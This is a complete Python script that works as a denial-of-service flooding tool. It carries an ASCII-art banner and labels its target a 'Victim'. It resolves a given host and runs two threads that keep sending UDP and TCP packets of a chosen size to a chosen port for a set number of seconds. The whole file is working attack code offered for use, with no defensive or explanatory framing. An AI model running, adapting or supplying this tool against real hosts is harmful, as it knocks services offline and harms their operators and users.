import sys
import time
import socket
import threading
from urllib.parse import urlparse

_abort = False

def _udp(_ip, _data):
    global _abort
    while not _abort:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect((_ip, int(sys.argv[2])))
            s.send(_data.encode())
            s.close()
        except Exception as e:
            print("UDP Exception:", e)

def _tcp(_ip, _data):
    global _abort
    while not _abort:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((_ip, int(sys.argv[2])))
            s.send(_data.encode())
            s.close()
        except Exception as e:
            print("TCP Exception:", e)

def _rslv():
    _host = sys.argv[1].lower()
    if not (_host.startswith('http://') or _host.startswith('https://')):
        _host = "http://" + _host

    try:
        _domain = urlparse(_host).netloc
        _ip = socket.gethostbyname(_domain)
        return _domain, _ip
    except KeyboardInterrupt:
        sys.exit('\r\n DNS resolution failed!\r\n')

def main():
    global _abort
    if len(sys.argv) != 5:
        sys.exit('\r\n   Usage: <target> <port> <size> <seconds>\r\n')

    _domain, _ip = _rslv()

    x = ""
    while len(x) < int(sys.argv[3]):
        x = x + "$"

    print('''\r\n\r\n\r\n\r\n\r\n\r\n\r\n
              ██      ██
             ░██     ░░
   ███████  ██████    ██  ███████    ██████    ██████   ███████
  ██░░░░░  ░░░██░    ░██ ░██░░░░██  ██░░░░██  ██░░░░██ ░██░░░░██
 ░░██████    ░██     ░██ ░██   ░██ ░██ ██░██ ░████████ ░██   ░░
  ░░░░░░██   ░██  ██ ░██ ░██   ░██ ░██░░ ░██ ░██       ░██
  ███████    ░░████  ░██ ░██   ░██ ░░███████ ░░███████ ░██
 ░░░░░░░      ░░░░   ░░  ░░    ░░   ░░░░░░██  ░░░░░░░  ░░
                                    ██   ░██
                                   ░░██████
                                    ░░░░░░ 
''')
    print("\r\n Victim @ " + sys.argv[1] + ":" + sys.argv[2] + " is taking massive L's for " + sys.argv[4] + " seconds...\r\n")

    t1 = threading.Thread(target=_udp, args=(_ip, x))
    t2 = threading.Thread(target=_tcp, args=(_ip, x))
    t1.start()
    t2.start()

    stopAt = time.time() + int(sys.argv[4])
    try:
        while time.time() < stopAt:
            pass
    except KeyboardInterrupt:
        pass

    _abort = True

    t1.join()
    t2.join()

    sys.exit('\r\n Done!\r\n')

if __name__ == "__main__":
    main()
